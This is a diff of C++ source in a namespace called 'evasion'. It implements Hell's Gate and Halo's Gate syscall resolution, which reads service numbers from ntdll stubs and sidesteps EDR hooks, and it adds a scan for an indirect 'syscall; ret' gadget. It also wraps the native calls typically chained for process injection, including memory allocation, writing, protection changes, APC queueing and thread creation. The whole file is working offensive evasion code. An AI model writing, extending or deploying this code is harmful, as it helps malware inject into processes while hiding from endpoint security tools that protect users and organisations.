@@ -1,5 +1,4 @@
 #include "Syscalls.h"
-#include <winternl.h>
 #include <algorithm>
 
 namespace evasion {
@@ -33,13 +32,10 @@ void SyscallResolver::ResolveAll() {
             // Logic to find SSN
             PBYTE funcAddr = (PBYTE)hNtdll + addrPtr[ordPtr[i]];
             
-            // Search for: mov eax, SSN (0xB8)
-            // HellsGate: find SSN directly from stub
             DWORD ssn = 0;
             bool found = false;
 
-            // Look for 'mov eax, SSN' pattern: 4C 8B D1 B8 SSN_LOW SSN_HIGH 00 00
-            // Or just B8 SSN_LOW SSN_HIGH 00 00
+            // Search for: mov eax, SSN (0xB8)
             for (int offset = 0; offset < 32; offset++) {
                 if (funcAddr[offset] == 0xB8) { // mov eax, imm32
                     ssn = *(DWORD*)&funcAddr[offset + 1];
@@ -47,18 +43,14 @@ void SyscallResolver::ResolveAll() {
                     break;
                 }
                 
-                // HalosGate: If we hit a jump (EDR hook), look at neighboring functions
-                if (funcAddr[offset] == 0xE9) { // jmp
-                    // Check up and down for unhooked neighbors
+                if (funcAddr[offset] == 0xE9) { // jmp (EDR hook)
                     for (int idx = 1; idx < 10; idx++) {
-                        // Check neighbor above
                         PBYTE neighborUpper = funcAddr - (idx * 32); 
                         if (neighborUpper[3] == 0xB8) {
                             ssn = (*(DWORD*)&neighborUpper[4]) + idx;
                             found = true;
                             break;
                         }
-                        // Check neighbor below
                         PBYTE neighborLower = funcAddr + (idx * 32);
                         if (neighborLower[3] == 0xB8) {
                             ssn = (*(DWORD*)&neighborLower[4]) - idx;
@@ -75,15 +67,35 @@ void SyscallResolver::ResolveAll() {
                 ntName[0] = 'N'; ntName[1] = 't';
                 m_syscallMap[ntName] = ssn;
                 
-                // Find a syscall gadget if we haven't already
+                // Robustly find a syscall; ret gadget
                 if (!m_syscallGadget) {
+                    // Try looking in the current function first
                     for (int g = 0; g < 64; g++) {
                         if (funcAddr[g] == 0x0F && funcAddr[g+1] == 0x05 && funcAddr[g+2] == 0xC3) {
                             m_syscallGadget = (PVOID)(funcAddr + g);
+                            break;
                         }
                     }
                 }
             }
+        }
+    }
+
+    // Fallback: If no gadget found in functions, scan ntdll text section for 'syscall; ret'
+    if (!m_syscallGadget) {
+        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+            if (strcmp((char*)section[i].Name, ".text") == 0) {
+                PBYTE start = (PBYTE)hNtdll + section[i].VirtualAddress;
+                DWORD size = section[i].Misc.VirtualSize;
+                for (DWORD j = 0; j < size - 2; j++) {
+                    if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
+                        m_syscallGadget = (PVOID)(start + j);
+                        break;
+                    }
+                }
+            }
+            if (m_syscallGadget) break;
         }
     }
 }
@@ -100,69 +112,107 @@ PVOID SyscallResolver::GetSyscallGadget() {
 }
 
 NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtAllocateVirtualMemory");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)ZeroBits, (UINT_PTR)RegionSize, (UINT_PTR)AllocationType, (UINT_PTR)Protect, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtAllocateVirtualMemory");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)ZeroBits, (UINT_PTR)RegionSize, (UINT_PTR)AllocationType, (UINT_PTR)Protect, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtWriteVirtualMemory");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)Buffer, (UINT_PTR)NumberOfBytesToWrite, (UINT_PTR)NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtWriteVirtualMemory");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)Buffer, (UINT_PTR)NumberOfBytesToWrite, (UINT_PTR)NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtProtectVirtualMemory");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)RegionSize, (UINT_PTR)NewProtect, (UINT_PTR)OldProtect, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtProtectVirtualMemory");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)RegionSize, (UINT_PTR)NewProtect, (UINT_PTR)OldProtect, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtQueueApcThreadEx(HANDLE ThreadHandle, HANDLE UserApcReserveHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtQueueApcThreadEx");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ThreadHandle, (UINT_PTR)UserApcReserveHandle, (UINT_PTR)ApcRoutine, (UINT_PTR)ApcArgument1, (UINT_PTR)ApcArgument2, (UINT_PTR)ApcArgument3, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtQueueApcThreadEx");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)UserApcReserveHandle, (UINT_PTR)ApcRoutine, (UINT_PTR)ApcArgument1, (UINT_PTR)ApcArgument2, (UINT_PTR)ApcArgument3, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtResumeThread");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ThreadHandle, (UINT_PTR)SuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtResumeThread");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)SuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtSuspendThread");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ThreadHandle, (UINT_PTR)PreviousSuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtSuspendThread");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)PreviousSuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtGetContextThread");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ThreadHandle, (UINT_PTR)ThreadContext, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtGetContextThread");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)ThreadContext, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtCreateThreadEx");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ThreadHandle, (UINT_PTR)DesiredAccess, (UINT_PTR)ObjectAttributes, (UINT_PTR)ProcessHandle, (UINT_PTR)StartRoutine, (UINT_PTR)Argument, (UINT_PTR)CreateFlags, (UINT_PTR)ZeroBits, (UINT_PTR)StackSize, (UINT_PTR)MaximumStackSize, (UINT_PTR)AttributeList);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtCreateThreadEx");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)DesiredAccess, (UINT_PTR)ObjectAttributes, (UINT_PTR)ProcessHandle, (UINT_PTR)StartRoutine, (UINT_PTR)Argument, (UINT_PTR)CreateFlags, (UINT_PTR)ZeroBits, (UINT_PTR)StackSize, (UINT_PTR)MaximumStackSize, (UINT_PTR)AttributeList);
 }
 
 NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtSetContextThread");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ThreadHandle, (UINT_PTR)ThreadContext, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtSetContextThread");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ThreadHandle, (UINT_PTR)ThreadContext, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtWaitForSingleObject");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)Handle, (UINT_PTR)Alertable, (UINT_PTR)Timeout, 0, 0, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtWaitForSingleObject");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)Handle, (UINT_PTR)Alertable, (UINT_PTR)Timeout, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 NTSTATUS SysNtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
-    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtFreeVirtualMemory");
-    if (ssn == 0xFFFFFFFF) return 0xC0000001;
-    return InternalDoSyscall(ssn, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)RegionSize, (UINT_PTR)FreeType, 0, 0, 0, 0, 0, 0, 0);
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtFreeVirtualMemory");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)ProcessHandle, (UINT_PTR)BaseAddress, (UINT_PTR)RegionSize, (UINT_PTR)FreeType, 0, 0, 0, 0, 0, 0, 0);
+}
+
+NTSTATUS SysNtWriteFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtWriteFile");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)FileHandle, (UINT_PTR)Event, (UINT_PTR)ApcRoutine, (UINT_PTR)ApcContext, (UINT_PTR)IoStatusBlock, (UINT_PTR)Buffer, (UINT_PTR)Length, (UINT_PTR)ByteOffset, (UINT_PTR)Key, 0, 0);
+}
+
+NTSTATUS SysNtClose(HANDLE Handle) {
+    auto& res = SyscallResolver::GetInstance();
+    DWORD ssn = res.GetServiceNumber("NtClose");
+    PVOID gadget = res.GetSyscallGadget();
+    if (ssn == 0xFFFFFFFF || !gadget) return 0xC0000001;
+    return InternalDoSyscall(ssn, gadget, (UINT_PTR)Handle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 } // namespace evasion
